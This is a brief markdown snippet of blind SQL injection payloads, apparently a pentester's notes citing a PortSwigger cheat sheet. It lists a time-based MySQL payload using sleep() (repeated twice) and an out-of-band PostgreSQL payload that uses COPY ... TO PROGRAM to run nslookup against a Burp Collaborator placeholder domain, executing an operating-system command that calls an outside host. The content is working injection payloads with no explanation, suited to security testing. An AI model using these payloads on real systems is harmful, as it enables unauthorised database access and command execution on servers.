# Blind SQL

https://portswigger.net/web-security/sql-injection/cheat-sheet
### Payloads

```
XOR(if(now()=sysdate(),sleep(5),0))XOR
```

```
XOR(if(now()=sysdate(),sleep(5),0))XOR
```

### OAST Payloads

```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

